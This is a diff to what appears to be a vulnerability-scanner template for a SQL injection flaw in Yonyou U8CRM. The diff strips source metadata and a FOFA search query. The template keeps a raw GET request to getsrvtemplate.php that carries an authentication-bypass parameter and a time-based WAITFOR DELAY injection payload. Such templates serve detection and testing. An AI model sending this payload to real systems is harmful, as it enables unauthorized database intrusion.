@@ -3,12 +3,8 @@ info:
   name: 用友U8CRM getsrvtemplate存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hy4d45co2ixqbmfa'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hy4d45co2ixqbmfa
-    fofa: app="用友U8CRM"
 http:
 - raw:
   - 'GET /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1&Action=fromsrvtpl&ProductID='';WAITFOR%20DELAY%20''0:0:5''-- HTTP/1.1
@@ -27,7 +23,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Accept-Language: zh-CN,zh;q=0.9![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763286128166-ddfa6dc2-4c7a-4f5e-884e-6248ad82e12e.png)'
+    Accept-Language: zh-CN,zh;q=0.9'
   redirects: false
   matchers:
   - status:
